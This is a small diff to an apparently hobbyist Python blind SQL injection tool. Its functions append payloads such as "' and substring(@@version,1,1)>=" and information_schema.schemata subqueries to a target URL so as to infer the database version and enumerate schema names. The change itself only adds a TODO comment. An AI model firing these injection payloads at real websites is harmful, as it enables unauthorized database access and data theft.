@@ -72,7 +72,6 @@ def sql_version(url, bypass):
         uri = url + "' and "  + "substring(@@version,1,1)>=" + str(i) + " or '"
     '''
     for sql_version in range(4,7):
-
         uri = url + "' and "  + "substring(@@version,1,1)>=" + str(sql_version) + str(bypass)
         server_response = request_handler(uri)
         server_response_status = validate_request(server_response)
@@ -92,6 +91,10 @@ def eunum_databases(url, bypass):
         Request working on leettime
         Is the base request for finding the number of databases, how many characters are in each database name
         ' and substring((select schema_name from information_schema.schemata limit 0,1),1,1)>=0 or '
+
+        TODO
+            Handle the case where database increment starts at 1 so first test will be false, second true, n true, o false...
+        TODO
     '''
     database_increment = 0
 
